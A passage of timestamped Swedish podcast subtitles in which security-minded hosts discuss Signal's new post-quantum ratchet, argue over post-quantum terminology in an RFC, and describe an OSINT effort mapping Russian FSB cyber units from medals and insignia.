Det här känns ju som att det är



`1626 00:47:43,000 --> 00:47:46,320`
Säger du när det är liksom en jävla morots man som styr det landet



`1627 00:47:46,580 --> 00:47:49,900`
Jo jo men det här är ju så dumt



`1628 00:47:50,160 --> 00:47:52,200`
Det känns ju mer som en ving



`1629 00:47:52,460 --> 00:47:54,520`
Och det har vi extendat vår no-flight här



`1630 00:47:56,560 --> 00:47:59,120`
Dummare saker har hänt



`1631 00:47:59,380 --> 00:48:02,700`
Nej men det här verkar så dumt så jag tror mer på att det är en



`1632 00:48:03,220 --> 00:48:03,720`
Liksom



`1633 00:48:04,800 --> 00:48:07,360`
Gigantisk fuckup känns det mer logiskt förklart



`1634 00:48:07,620 --> 00:48:09,160`
Alltså jag vill att du har rätt Peter, jag vill att det ska vara så



`1635 00:48:09,400 --> 00:48:10,180`
Jag hoppas att det är så



`1636 00:48:10,440 --> 00:48:13,760`
Men om jag skulle bygga en bakdörr för henne så



`1637 00:48:14,020 --> 00:48:15,040`
Så hade jag inte gjort



`1638 00:48:15,300 --> 00:48:17,340`
Den här hemliga url-en



`1639 00:48:17,600 --> 00:48:19,140`
Nog för att du är Peter Peter



`1640 00:48:19,400 --> 00:48:20,420`
Det skulle ju vara lätt för er



`1641 00:48:20,680 --> 00:48:21,700`
Men välkurvan för intelligens



`1642 00:48:21,960 --> 00:48:23,240`
Om man nu jämför det med



`1643 00:48:23,480 --> 00:48:26,300`
Dumma människor den är, ja jag orkar, jag vill inte ens gå ner på det här



`1644 00:48:26,560 --> 00:48:28,100`
Ja så kan det absolut vara



`1645 00:48:28,360 --> 00:48:29,640`
Microsoft, jävla skitbolag



`1646 00:48:29,640 --> 00:48:30,140`
Ja



`1647 00:48:30,400 --> 00:48:32,960`
Hahaha



`1648 00:48:33,220 --> 00:48:33,720`
Ja visst



`1649 00:48:33,720 --> 00:48:38,320`
Jag vill vajsa på Oracle och jag vill vajsa på Microsoft



`1650 00:48:38,580 --> 00:48:40,120`
Det kommer



`1651 00:48:40,380 --> 00:48:43,440`
Du har sånt till Amazons försvar



`1652 00:48:43,700 --> 00:48:47,800`
Så kommer det ut 18 miljoner sidor löpande om deras



`1653 00:48:48,320 --> 00:48:49,840`
Deras liksom outage



`1654 00:48:50,100 --> 00:48:51,640`
Hur var det nu med Azure, vad hände egentligen?



`1655 00:48:51,900 --> 00:48:52,660`
No one knows



`1656 00:48:52,920 --> 00:48:54,460`
Det är mer om det i nästa avsnitt kan jag säga



`1657 00:48:54,720 --> 00:48:56,000`
Ja så är det faktiskt



`1658 00:48:56,240 --> 00:48:58,040`
Men annars Johan



`1659 00:48:58,300 --> 00:48:59,060`
Signal



`1660 00:48:59,320 --> 00:49:01,120`
Ska vi prata lite bättre bolag



`1661 00:49:02,400 --> 00:49:03,420`
Ja iallafall innan chat-kontrollen



`1662 00:49:03,720 --> 00:49:07,040`
Ja iallafall inom sånt som vi berörs av som privacy



`1663 00:49:07,300 --> 00:49:07,820`
Ja



`1664 00:49:08,080 --> 00:49:09,860`
Signal som ni alla känner till och älskar



`1665 00:49:10,120 --> 00:49:13,700`
Som man ju bara har på sin telefon ifall man säljer barnporr eller köper knark



`1666 00:49:13,960 --> 00:49:15,760`
Som bara justitieminister har sagt



`1667 00:49:16,000 --> 00:49:16,780`
Så jävla kul grej



`1668 00:49:17,040 --> 00:49:17,800`
Mina barn



`1669 00:49:18,060 --> 00:49:20,880`
16 år de kom alltså till mig och sa precis det



`1670 00:49:21,120 --> 00:49:22,660`
De hade fått höra det i skolan typ



`1671 00:49:23,180 --> 00:49:26,240`
Signal, ja det var nog fan en polis som besökte skolan



`1672 00:49:26,500 --> 00:49:31,620`
Som sa just det, det är varningstecken om föräldrarna ser barn som har signal på sina telefoner



`1673 00:49:31,880 --> 00:49:32,400`
Då är det ett varningstecken



`1674 00:49:32,640 --> 00:49:33,680`
Jag sa vad i helvete



`1675 00:49:33,980 --> 00:49:36,020`
Nu installerar ni signal med en gång



`1676 00:49:36,280 --> 00:49:39,360`
Det var typ justitieministern eller något som sa det



`1677 00:49:39,600 --> 00:49:41,660`
Ja det är så jäkla kortsiktigt



`1678 00:49:41,920 --> 00:49:44,720`
Hål i huvudet, iallafall Signal, bra skit



`1679 00:49:44,980 --> 00:49:49,340`
Och de är ju till och med så pass kloka, de kör ju



`1680 00:49:49,600 --> 00:49:52,660`
Som ni alla vet krypterar kommunikation på massa olika sätt



`1681 00:49:52,920 --> 00:49:55,480`
Chat, video, telefon



`1682 00:49:55,740 --> 00:49:56,240`
Och så vidare



`1683 00:49:56,760 --> 00:49:58,800`
Och de använder sig av kryptering



`1684 00:49:59,320 --> 00:49:59,840`
Standard



`1685 00:50:00,080 --> 00:50:02,400`
Traditionell typ Diffie-Hellman style



`1686 00:50:02,640 --> 00:50:03,160`
encryption



`1687 00:50:04,480 --> 00:50:05,000`
Men



`1688 00:50:05,260 --> 00:50:07,820`
Vi vet ju att vi lever i en modern tid



`1689 00:50:08,080 --> 00:50:09,360`
Quantum



`1690 00:50:09,600 --> 00:50:10,120`
Ja exakt



`1691 00:50:10,380 --> 00:50:11,660`
Det kommer Quantum



`1692 00:50:11,920 --> 00:50:15,760`
Eller Q från Star Trek kommer och äter upp alla våra bits



`1693 00:50:17,540 --> 00:50:19,080`
Så de blir Q-bits



`1694 00:50:20,100 --> 00:50:23,940`
That's not how it works



`1695 00:50:24,200 --> 00:50:27,020`
Det kan vara både och



`1696 00:50:27,280 --> 00:50:29,580`
Så har jag fattat det iallafall



`1697 00:50:29,840 --> 00:50:31,120`
It's a lie



`1698 00:50:31,620 --> 00:50:33,420`
Så vad gör man då som signal?



`1699 00:50:33,720 --> 00:50:38,320`
Vi måste ju skydda våra användare mot post-quantum-kryptografiska attacker



`1700 00:50:38,840 --> 00:50:40,120`
När de väl kommer



`1701 00:50:40,880 --> 00:50:43,440`
Och det finns ju som ni vet



`1702 00:50:43,700 --> 00:50:45,240`
En del



`1703 00:50:45,500 --> 00:50:47,540`
överträde krypterings-



`1704 00:50:47,800 --> 00:50:48,320`
Sviter



`1705 00:50:48,820 --> 00:50:52,660`
Som ska skydda mot just post-quantum-krypto-attacker



`1706 00:50:53,180 --> 00:50:56,500`
Och detta har de nu alltså infört i Signal



`1707 00:50:57,020 --> 00:50:57,780`
Med



`1708 00:50:58,300 --> 00:50:59,840`
På ett jävligt imponerande sätt



`1709 00:51:00,080 --> 00:51:00,860`
Alltså det är



`1710 00:51:01,360 --> 00:51:03,680`
Jävla jobb som har lagts ner för att göra detta



`1711 00:51:03,980 --> 00:51:06,280`
De har alltså infört någonting som de kallar för



`1712 00:51:06,540 --> 00:51:08,320`
SPQR det står för



`1713 00:51:08,580 --> 00:51:10,380`
Sparse Post-Quantum Ratchet



`1714 00:51:12,160 --> 00:51:12,940`
Det vet man ju



`1715 00:51:13,200 --> 00:51:14,980`
Häll en ratchet i kryptostacken



`1716 00:51:15,240 --> 00:51:16,520`
Ratchet är en sån där



`1717 00:51:16,780 --> 00:51:17,280`
Spärrnyckel



`1718 00:51:17,540 --> 00:51:19,080`
En spärrnyckel



`1719 00:51:19,340 --> 00:51:20,620`
Är det det rätt på svenska?



`1720 00:51:20,880 --> 00:51:21,640`
Som



`1721 00:51:21,900 --> 00:51:23,940`
Som jag fattade så är det så att varje gång du



`1722 00:51:24,200 --> 00:51:26,000`
Har ett meddelande utbyte



`1723 00:51:26,240 --> 00:51:26,760`
På Signal



`1724 00:51:27,020 --> 00:51:28,560`
Så kör en



`1725 00:51:28,800 --> 00:51:30,340`
Ratchet framåt



`1726 00:51:30,860 --> 00:51:32,900`
Det vill säga att även ifall någon har



`1727 00:51:32,900 --> 00:51:37,260`
Om du har en kompromiss på din enhet eller ditt konto eller vad man ska säga



`1728 00:51:37,500 --> 00:51:38,540`
Vid ett



`1729 00:51:38,780 --> 00:51:39,560`
Tidpunkt



`1730 00:51:40,320 --> 00:51:45,700`
Så hjälper det inte din motståndare att läsa meddelande som skickas efter eller före



`1731 00:51:47,240 --> 00:51:49,280`
Och nu har de då infört



`1732 00:51:49,540 --> 00:51:50,300`
I transit



`1733 00:51:51,080 --> 00:51:51,840`
Ja eller



`1734 00:51:52,100 --> 00:51:53,900`
Ja jag antar i lagring också



`1735 00:51:54,660 --> 00:51:55,180`
Det är nog svårt



`1736 00:51:55,180 --> 00:51:57,220`
Nej men i transit måste det vara



`1737 00:51:57,740 --> 00:51:59,020`
Men



`1738 00:51:59,260 --> 00:52:01,060`
Ratchet läser ju alltså



`1739 00:52:01,320 --> 00:52:01,820`
Backward



`1740 00:52:02,900 --> 00:52:03,920`
Secrecy



`1741 00:52:04,180 --> 00:52:07,000`
Perfect forward secrecy fast backward då



`1742 00:52:07,260 --> 00:52:11,600`
Ja precis, forward secrecy löser ju Diffie Hellman och ratchet löser



`1743 00:52:12,380 --> 00:52:14,420`
Backward secrecy på något vänster



`1744 00:52:14,680 --> 00:52:15,960`
Och här har de då infört en



`1745 00:52:16,220 --> 00:52:18,000`
Som jag fattade en



`1746 00:52:19,020 --> 00:52:20,060`
Tredje ratchet



`1747 00:52:20,300 --> 00:52:22,860`
Vilket i det här fallet då är



`1748 00:52:23,120 --> 00:52:23,640`
Kontum



`1749 00:52:24,140 --> 00:52:25,180`
Säkra ratchet



`1750 00:52:25,420 --> 00:52:26,200`
Funktionaliteten



`1751 00:52:26,960 --> 00:52:29,020`
För då har de ju tidigare då för



`1752 00:52:29,260 --> 00:52:30,300`
Forward secrecy



`1753 00:52:30,800 --> 00:52:32,080`
Kryptering som vi känner till och



`1754 00:52:32,900 --> 00:52:36,220`
Antar jag för den var den första ratcheten, jag har dålig koll



`1755 00:52:36,480 --> 00:52:37,260`
Men ni fattar



`1756 00:52:37,500 --> 00:52:39,820`
Den tredje är i alla fall post quantum ratchet



`1757 00:52:40,060 --> 00:52:41,100`
Funktionaliteten då



`1758 00:52:43,400 --> 00:52:45,180`
Och där är dessutom



`1759 00:52:45,440 --> 00:52:46,980`
Backward compatible



`1760 00:52:48,000 --> 00:52:50,820`
Det rullar dessutom automatiskt till alla användare



`1761 00:52:51,080 --> 00:52:52,360`
Även ifall man inte uppdaterar



`1762 00:52:54,140 --> 00:52:55,420`
Och



`1763 00:52:55,680 --> 00:52:56,460`
Om



`1764 00:52:57,740 --> 00:53:01,820`
Det kanske kräver uppdatering i och för sig men det rullar dessutom automatiskt i alla fall



`1765 00:53:01,820 --> 00:53:03,860`
Och grejen är då att ifall



`1766 00:53:04,120 --> 00:53:10,020`
Båda användare är uppdaterade så går den automatiskt över till att köra med den nya 3-ratchet versionen



`1767 00:53:10,260 --> 00:53:11,800`
Om man inte gör det så downgradar den till



`1768 00:53:12,580 --> 00:53:13,860`
Den gamla 2-ratchet



`1769 00:53:14,360 --> 00:53:15,140`
Metoden



`1770 00:53:16,420 --> 00:53:17,440`
Och



`1771 00:53:17,940 --> 00:53:19,220`
Det är inte liksom



`1772 00:53:20,000 --> 00:53:21,540`
Någonting som man bara



`1773 00:53:21,780 --> 00:53:27,940`
Slänger in utan de har jobbat tillsammans med forskare testat detta och gjort formella kriptografiska verifieringar



`1774 00:53:28,180 --> 00:53:29,720`
På hela konceptet



`1775 00:53:29,980 --> 00:53:31,000`
Och införandet



`1776 00:53:31,820 --> 00:53:33,360`
Och sen skrivit en



`1777 00:53:33,860 --> 00:53:35,140`
26000



`1778 00:53:35,400 --> 00:53:36,940`
Ord lång write-up



`1779 00:53:37,200 --> 00:53:41,540`
Om hur detta gick till och hur de gjorde det utan någon form av downtime eller



`1780 00:53:42,060 --> 00:53:42,580`
Problematik



`1781 00:53:42,820 --> 00:53:43,600`
Med backwards



`1782 00:53:44,360 --> 00:53:45,140`
Compatibility



`1783 00:53:45,380 --> 00:53:46,420`
Och alla sådana goa grejer



`1784 00:53:47,440 --> 00:53:48,980`
Så coolt jobbat tycker jag



`1785 00:53:49,220 --> 00:53:50,260`
Verkligen och vi gillade



`1786 00:53:50,500 --> 00:53:52,040`
Vi snackade väl



`1787 00:53:53,840 --> 00:53:55,120`
För ett år sedan kanske



`1788 00:53:55,880 --> 00:53:56,900`
Om att



`1789 00:53:57,160 --> 00:53:58,700`
Äpplet hade gjort en snarlik där va



`1790 00:53:59,220 --> 00:54:00,240`
Ja det kanske det var



`1791 00:54:01,000 --> 00:54:01,780`
För de äpplet



`1792 00:54:02,080 --> 00:54:06,940`
Nej men äpplet skröt ju i något white paper om att de var



`1793 00:54:07,460 --> 00:54:10,520`
Bättre än Signal och nu har väl Signal sagt



`1794 00:54:10,780 --> 00:54:11,540`
FU



`1795 00:54:14,100 --> 00:54:16,160`
Ja så Signal, bra bolag



`1796 00:54:16,420 --> 00:54:18,200`
För er



`1797 00:54:18,460 --> 00:54:22,040`
Liksom jag som blir upprörda utav alla felsägningar



`1798 00:54:22,300 --> 00:54:26,140`
Från Johan här så kan jag rekommendera en ny källa



`1799 00:54:26,400 --> 00:54:28,440`
Det är alltså inte alls



`1800 00:54:28,700 --> 00:54:30,500`
Post-Quantum-attacker



`1801 00:54:30,500 --> 00:54:34,860`
Utan det är ju helt vanliga attacker som använder Shores-algoritm



`1802 00:54:35,100 --> 00:54:39,200`
När du har kommit fram en cryptographically relevant quantum-computer



`1803 00:54:39,460 --> 00:54:41,760`
Alltså en CRQC



`1804 00:54:42,020 --> 00:54:45,340`
Även ifall någon har stulit in data nu så kan de inte rake det sen



`1805 00:54:45,600 --> 00:54:49,700`
Det låter ju osagt men jag menar det är inte en Post-Quantum-attack



`1806 00:54:49,960 --> 00:54:51,240`
Utan det är



`1807 00:54:51,740 --> 00:54:54,560`
En helt vanlig attack som använder Shores-algoritm



`1808 00:54:54,820 --> 00:54:58,920`
När det finns en kvantumdator eller en så kallad CRQC



`1809 00:54:59,180 --> 00:55:00,460`
Det är en kvantum-attack



`1810 00:55:00,760 --> 00:55:04,340`
Kryptographically relevant quantum-computer



`1811 00:55:04,600 --> 00:55:05,880`
Som då kan puncha matte snabbt



`1812 00:55:06,140 --> 00:55:07,420`
Men vänta



`1813 00:55:08,440 --> 00:55:10,740`
Stör inte mina vibes här nu



`1814 00:55:11,000 --> 00:55:12,540`
Men var det otydligt vad Johan menade?



`1815 00:55:12,780 --> 00:55:17,400`
Han sa att det var en Post-Quantum-attack finns, det är ingenting som heter Post-Quantum-attack



`1816 00:55:17,660 --> 00:55:19,700`
Post-Quantum-attack



`1817 00:55:19,960 --> 00:55:23,800`
Play with me here nu, jag har ju en stor oro nu



`1818 00:55:24,060 --> 00:55:27,380`
Jag menar ju djupetvis attacker i en Post-Quantum-värld



`1819 00:55:27,640 --> 00:55:28,920`
Vi gillar dig Mattias



`1820 00:55:28,920 --> 00:55:34,040`
Du kan ju inte dissa mig nu så att säga att jag har sagt saker jag inte har sagt



`1821 00:55:34,300 --> 00:55:37,120`
Du sa att det var en Post-Quantum-attack



`1822 00:55:37,360 --> 00:55:39,420`
Det jag menade var attacken som sker i en Post-Quantum-värld



`1823 00:55:39,680 --> 00:55:43,260`
Och jag försöker säga här nu, terminologi är viktigt



`1824 00:55:43,520 --> 00:55:47,100`
För det har kommit en ny RFC



`1825 00:55:47,360 --> 00:55:51,200`
För de som vill lära sig säga rätt saker



`1826 00:55:51,440 --> 00:55:53,240`
Den här RFCen heter 97-94



`1827 00:55:53,500 --> 00:55:55,280`
Sämsta övergången i poddens historia



`1828 00:55:55,540 --> 00:55:57,080`
Jag hade bara tänkt så smidigt



`1829 00:55:57,340 --> 00:55:57,840`
Jag hoppar av



`1830 00:55:57,840 --> 00:55:58,620`
Men det blev som om



`1831 00:55:58,920 --> 00:56:00,200`
Jag klättrade upp på ett berg



`1832 00:56:00,460 --> 00:56:01,740`
Utan en sen



`1833 00:56:01,740 --> 00:56:02,760`
Vad heter det här RFCen?



`1834 00:56:02,760 --> 00:56:04,300`
Terminologi



`1835 00:56:04,560 --> 00:56:08,140`
For Post-Quantum-traditional-hybrid-schemes



`1836 00:56:08,400 --> 00:56:09,420`
Om du som lyssnar här



`1837 00:56:09,680 --> 00:56:15,300`
Den här RFCen är alltså tillbaka till för att klassa



`1838 00:56:15,560 --> 00:56:18,640`
Egentligen de algoritmerna som bland annat Signal har infört



`1839 00:56:18,880 --> 00:56:21,700`
Klassa dem eller använda rätt ord för att beskriva dem egentligen



`1840 00:56:21,960 --> 00:56:23,500`
Så den säger väldigt mycket om såhär



`1841 00:56:23,760 --> 00:56:28,100`
PQT, det är en Post-Quantum-traditional-hybrid-setup



`1842 00:56:28,100 --> 00:56:30,920`
Och sen finns det tusen andra ord i den här RFCen



`1843 00:56:31,180 --> 00:56:33,220`
Så man kan säga rätt saker



`1844 00:56:33,480 --> 00:56:34,240`
I nästa podcast



`1845 00:56:34,500 --> 00:56:35,520`
Då ska jag ju säga såhär



`1846 00:56:35,780 --> 00:56:39,100`
Attacka det i en Post-Quantum-värld istället för Post-Quantum-attacker



`1847 00:56:39,360 --> 00:56:41,420`
För det rullar ju av tungan så mycket bättre



`1848 00:56:41,660 --> 00:56:44,220`
Jag vill bara säga att vi är kända för att säga rätt saker typ jämt



`1849 00:56:44,480 --> 00:56:45,500`
Ja men det är en botbättring



`1850 00:56:45,760 --> 00:56:49,340`
Nu har vi RFC 97-94



`1851 00:56:49,600 --> 00:56:51,660`
Vi länkar det i våra show notes för vi har ett AI



`1852 00:56:51,900 --> 00:56:52,680`
RFC 97-94



`1853 00:56:52,940 --> 00:56:53,440`
Skit RFC



`1854 00:56:55,240 --> 00:56:57,020`
Jag tänker att det blir nattläck tid



`1855 00:56:57,020 --> 00:56:57,800`
Jag kan lägga till att det blir nattläck tid



`1856 00:56:58,100 --> 00:57:00,400`
Jag hade inga som helst problem att förstå, Johan



`1857 00:57:00,660 --> 00:57:02,200`
Jag tycker också att det var fint



`1858 00:57:02,460 --> 00:57:06,540`
Men visst, nu tänkte jag att vi hoppar till någonting som är offline



`1859 00:57:06,800 --> 00:57:07,580`
Ja, tack



`1860 00:57:07,820 --> 00:57:09,620`
Och det är ett gäng finnar



`1861 00:57:10,380 --> 00:57:11,420`
Som har gjort balla grejer



`1862 00:57:11,660 --> 00:57:13,980`
Ja, nu händer det grejer för den som är paragraferyftare



`1863 00:57:14,220 --> 00:57:15,500`
Men vi har hållit på ganska länge i den här podcasten



`1864 00:57:15,760 --> 00:57:16,540`
Så vi får stryka en



`1865 00:57:17,040 --> 00:57:18,320`
Så jag fortsätter hit



`1866 00:57:18,580 --> 00:57:19,860`
För den här är rolig



`1867 00:57:20,120 --> 00:57:22,160`
Det här har ingenting med någonting att göra egentligen



`1868 00:57:22,420 --> 00:57:23,440`
Som är hemma i den här podcasten



`1869 00:57:23,700 --> 00:57:24,720`
Förutom att det är jävligt coolt



`1870 00:57:25,240 --> 00:57:26,780`
Och att jag får bestämma vad jag vill prata om



`1871 00:57:27,020 --> 00:57:27,800`
Så häng med bara



`1872 00:57:28,100 --> 00:57:28,620`
Inget val



`1873 00:57:28,860 --> 00:57:31,420`
Jag äger dig, du som sitter där och lyssnar nu



`1874 00:57:31,680 --> 00:57:32,700`
Det blir inte sämre än så här



`1875 00:57:32,960 --> 00:57:34,240`
Men då är det nämligen så här



`1876 00:57:34,500 --> 00:57:36,300`
Open Source Intelligence ger ju ball ändå



`1877 00:57:37,060 --> 00:57:41,920`
Om ni såg Antons talk på Sektier där med vinflaskor som Peter köper



`1878 00:57:42,440 --> 00:57:45,000`
Peter som är en finsmakare gillar Gewis vin, det var roligt



`1879 00:57:45,260 --> 00:57:48,320`
Det var en passus, kolla på Sektier-talket så kommer ni förstå



`1880 00:57:48,580 --> 00:57:50,120`
En annan Peter, det finns fler som heter Peter



`1881 00:57:50,380 --> 00:57:52,940`
Det finns också fler som heter Johan, Jesper, Mattias och Rickard



`1882 00:57:53,180 --> 00:57:56,520`
Men det här ska handla om ett finskt gäng



`1883 00:57:57,280 --> 00:57:58,060`
Som i jämförelse med Open Source



`1884 00:57:58,320 --> 00:57:59,080`
Open Source Intelligence



`1885 00:57:59,340 --> 00:58:01,140`
Letar reda på



`1886 00:58:01,640 --> 00:58:05,220`
FSBs Cyber Operations



`1887 00:58:05,480 --> 00:58:07,780`
Falanger och vilka grenar som finns



`1888 00:58:08,820 --> 00:58:10,340`
Genomhör och häpna



`1889 00:58:10,860 --> 00:58:12,400`
Medaljer och



`1890 00:58:13,160 --> 00:58:13,680`
Patches



`1891 00:58:15,460 --> 00:58:18,020`
Här står det, jag jobbar i den här grenen



`1892 00:58:18,280 --> 00:58:18,800`
Exakt



`1893 00:58:19,060 --> 00:58:20,840`
Exakt så är det, så Johan



`1894 00:58:21,100 --> 00:58:22,640`
Skulle kunna vara en finsk Researcher



`1895 00:58:22,900 --> 00:58:26,220`
Den är lite mer än så involverad i det här då



`1896 00:58:26,480 --> 00:58:28,020`
Men vad de gör då det är ju att



`1897 00:58:28,320 --> 00:58:30,620`
Special Forces på den här snubben, där har han jobbat



`1898 00:58:31,900 --> 00:58:33,440`
Johan, killen med storyn



`1899 00:58:33,700 --> 00:58:36,500`
Om jag får prata till punkt så ska jag förklara att det här är jävligt roligt



`1900 00:58:36,760 --> 00:58:37,280`
Det fick ju jag göra sist



`1901 00:58:37,540 --> 00:58:39,320`
Nej, men det var fan inte mitt fel



`1902 00:58:39,580 --> 00:58:42,140`
Det får jag ändå säga, jag var tyst och bara lät det hända



`1903 00:58:42,400 --> 00:58:44,180`
Som med mycket annat



`1904 00:58:44,440 --> 00:58:46,240`
Men det som är kul då det är att



`1905 00:58:46,500 --> 00:58:49,560`
Vi kommer länka till den här artikeln för det är egentligen två



`1906 00:58:49,820 --> 00:58:52,640`
Oberoende osynt



`1907 00:58:53,140 --> 00:58:56,980`
Efforts som man gjort där, den första var för att kartlägga vitt och brett



`1908 00:58:57,240 --> 00:58:58,520`
Och den andra var då för att



`1909 00:58:58,780 --> 00:59:00,820`
Den jag läste är för att hona in på just



`1910 00:59:01,340 --> 00:59:02,860`
Signal intelligence, alltså typ



`1911 00:59:03,120 --> 00:59:07,220`
Signalspanning och olika cyberförband egentligen i Ryssland då som då



`1912 00:59:07,480 --> 00:59:09,260`
Som faller under FSB



`1913 00:59:09,780 --> 00:59:13,100`
Och vad ryssarna har gjort är att de har gett varandra massa konstiga namn



`1914 00:59:14,380 --> 00:59:15,920`
Olika



`1915 00:59:16,440 --> 00:59:19,500`
Olika cyber operations har balla namn så det kan vara typ såhär



`1916 00:59:20,020 --> 00:59:22,060`
Energetic bear, dragonfly



`1917 00:59:22,320 --> 00:59:23,600`
Bear, bear



`1918 00:59:23,860 --> 00:59:24,620`
Exakt, exakt



`1919 00:59:24,880 --> 00:59:26,680`
Bear-namnen är inte ryssarna som heter det



`1920 00:59:26,980 --> 00:59:27,740`
Det är väl NSA



`1921 00:59:28,000 --> 00:59:29,800`
Som har gett honom alltså



`1922 00:59:30,060 --> 00:59:35,680`
Skitsamma men det är vanligt att man har massa olika, jag skarvar här nu för det var ju typ tre veckor sedan jag läste detta



`1923 00:59:36,200 --> 00:59:41,820`
Men det är verkligen värt, det är en jättelång artikel så jag kommer butchra den här men läs den här efter jag har butchrat den



`1924 00:59:42,080 --> 00:59:44,640`
Och det de gör då det är att de hackar ju en jävligt



`1925 00:59:44,900 --> 00:59:46,180`
Enkel



`1926 00:59:46,700 --> 00:59:50,540`
Enkel liksom insignia i militärtjänst, man ska få medaljer



`1927 00:59:51,040 --> 00:59:54,120`
För sin uppskattning att man har liksom signalspanat bra



`1928 00:59:54,380 --> 00:59:56,680`
Man vill också gärna ha lite patches för att säga



`1929 00:59:56,680 --> 00:59:59,760`
Hur cool man är så inbördesbeundran går att framkalla



`1930 01:00:00,000 --> 01:00:05,120`
Och sen så vill man ju också ge i sin liksom coola patch så vill man ju ändå ge lite



`1931 01:00:05,640 --> 01:00:06,160`
Såhär



`1932 01:00:06,400 --> 01:00:08,720`
Ja men man vill visa en schysst parabolantenn



`1933 01:00:08,960 --> 01:00:10,240`
Eller något schysst slott



`1934 01:00:10,500 --> 01:00:11,520`
Eller någon liten grej



`1935 01:00:11,780 --> 01:00:12,800`
Jag jobbar för Space Force



`1936 01:00:13,060 --> 01:00:13,580`
Ja men exakt



`1937 01:00:13,840 --> 01:00:16,140`
Då vill man ju ha ett rymdskepp helst, man vill ju inte ha en banan



`1938 01:00:16,400 --> 01:00:17,160`
Tråkigt



`1939 01:00:17,680 --> 01:00:18,960`
Bananrepublik



`1940 01:00:19,200 --> 01:00:20,480`
Exakt det känns ju inte lika roligt



`1941 01:00:21,000 --> 01:00:23,820`
Men det som är roligt då det är att de börjar



`1942 01:00:24,080 --> 01:00:24,840`
Och



`1943 01:00:25,100 --> 01:00:26,640`
Scrapa bilder



`1944 01:00:26,940 --> 01:00:27,960`
På militärer



`1945 01:00:28,480 --> 01:00:31,040`
Och letar upp medaljer och



`1946 01:00:31,280 --> 01:00:33,600`
Insignia då, alltså lappar eller små



`1947 01:00:34,100 --> 01:00:36,660`
Code words och grejer för olika



`1948 01:00:37,180 --> 01:00:38,960`
Grupperingar helt enkelt



`1949 01:00:39,480 --> 01:00:40,500`
Och



`1950 01:00:41,520 --> 01:00:44,860`
Hitta då liksom, man kan kartlägga och bygga en



`1951 01:00:45,360 --> 01:00:47,420`
En karta över hur falangerna hänger ihop



`1952 01:00:47,680 --> 01:00:48,440`
En organisationsstruktur



`1953 01:00:48,700 --> 01:00:49,980`
Ja bra bra



`1954 01:00:50,240 --> 01:00:50,740`
Org chart



`1955 01:00:51,000 --> 01:00:53,820`
Exakt men jättesnyggt och så är det då



`1956 01:00:54,080 --> 01:00:56,380`
Inte nog med att man har liksom varje grupp



`1957 01:00:56,680 --> 01:00:57,700`
Och har liksom en



`1958 01:00:57,960 --> 01:00:58,720`
Viss



`1959 01:00:58,980 --> 01:01:00,260`
Pluton badge då



`1960 01:01:00,520 --> 01:01:02,820`
Man får ju också medaljer om man har gjort bra grejer



`1961 01:01:03,080 --> 01:01:04,880`
Kanske varit med på en viss övning eller en viss operation



`1962 01:01:05,120 --> 01:01:07,440`
Exakt så, och de visar ju lite ledtråd då



`1963 01:01:07,680 --> 01:01:11,020`
Och då gör de ett sånt jättepussel av det här



`1964 01:01:11,280 --> 01:01:13,320`
Jag går igång på det här för att det är verkligen någon som



`1965 01:01:13,580 --> 01:01:14,860`
Har kört, alltså det är ju såhär



`1966 01:01:15,120 --> 01:01:16,900`
Det är inte såhär, ja men jag har en fredag över, vi kör



`1967 01:01:17,160 --> 01:01:18,960`
De har grejat



`1968 01:01:19,200 --> 01:01:20,240`
De har grejat



`1969 01:01:20,740 --> 01:01:24,840`
Och jämfört olika versioner och se hur de har utvecklats och allting



`1970 01:01:25,360 --> 01:01:25,860`
Och det



`1971 01:01:26,120 --> 01:01:26,640`
Det är liksom mycket



`1972 01:01:26,940 --> 01:01:28,220`
De mynnar ut att de



`1973 01:01:28,720 --> 01:01:29,760`
Lycksas hitta



`1974 01:01:30,520 --> 01:01:31,800`
Fysiska positioner



`1975 01:01:32,320 --> 01:01:33,080`
Där



`1976 01:01:33,340 --> 01:01:36,400`
De här grupperingarna sannolikt har sin bas



`1977 01:01:36,920 --> 01:01:39,220`
I såhär små konstiga grejer då såhär bara men



`1978 01:01:39,480 --> 01:01:41,780`
De refererar till det här vapnet här och här



`1979 01:01:42,040 --> 01:01:44,080`
Och den här byggnaden syns här och här



`1980 01:01:44,340 --> 01:01:45,620`
Var det inte till och med såhär silhuetter



`1981 01:01:45,880 --> 01:01:48,440`
Landmassasilhuetter och sånt där



`1982 01:01:48,700 --> 01:01:49,980`
Massa sådana balla grejer



`1983 01:01:50,240 --> 01:01:55,100`
Skånes outline, då kunde man se det som en del i en medalj, okej de är förmodligen i den delen av Ryssland



`1984 01:01:55,360 --> 01:01:55,860`
Och så då typ



`1985 01:01:55,860 --> 01:01:57,400`
Precis den



`1986 01:01:57,660 --> 01:01:58,420`
Något berg kanske



`1987 01:01:58,680 --> 01:01:59,700`
Något berg och så någon



`1988 01:01:59,960 --> 01:02:03,800`
Någon slottsbyggnad och då har de suttit och skrapat Google Maps liksom



`1989 01:02:04,300 --> 01:02:06,620`
Och hittat de här byggnaderna och då kan man också se



`1990 01:02:07,120 --> 01:02:11,740`
Och då faller pusselbitarna på plats och då kan man kartlägga alla de här härstammar härifrån



`1991 01:02:12,240 --> 01:02:13,020`
Och så kan man då



`1992 01:02:13,260 --> 01:02:15,580`
Se då om det är kortvågs



`1993 01:02:15,820 --> 01:02:18,640`
Antennor eller parabolantennor, vad det är för typ



`1994 01:02:18,900 --> 01:02:19,920`
Det är så jävla coolt



`1995 01:02:20,440 --> 01:02:21,460`
Eller jag tycker det i alla fall



`1996 01:02:21,720 --> 01:02:23,500`
Jag har läst den också, jag tycker den är superbra



`1997 01:02:23,760 --> 01:02:25,040`
Så det ska vi länka till i workshopet



`1998 01:02:25,040 --> 01:02:28,120`
Jag kommer inte gå in djupare än så men det är svinball



`1999 01:02:28,360 --> 01:02:33,480`
Såhär nu ser man ju bara resultatet av deras research, det finns säkert massa fel och brister i den här



`2000 01:02:33,740 --> 01:02:37,320`
Men skit i det för det ser skitball ut, alltså det ser verkligen riktigt proffsigt ut



`2001 01:02:37,580 --> 01:02:40,920`
Jag har inte läst den här men däremot så



`2002 01:02:42,440 --> 01:02:45,780`
För länge sedan så gick ju viralt



`2003 01:02:46,040 --> 01:02:48,600`
En jättekul bildsamling på



`2004 01:02:49,100 --> 01:02:52,180`
Spionprogram badges



`2005 01:02:52,440 --> 01:02:54,740`
Från Space Force och



`2006 01:02:54,740 --> 01:02:57,560`
NRO och andra spionorganisationer



`2007 01:02:58,320 --> 01:03:00,880`
Och där är det ju såhär



`2008 01:03:01,400 --> 01:03:02,160`
Lite grann



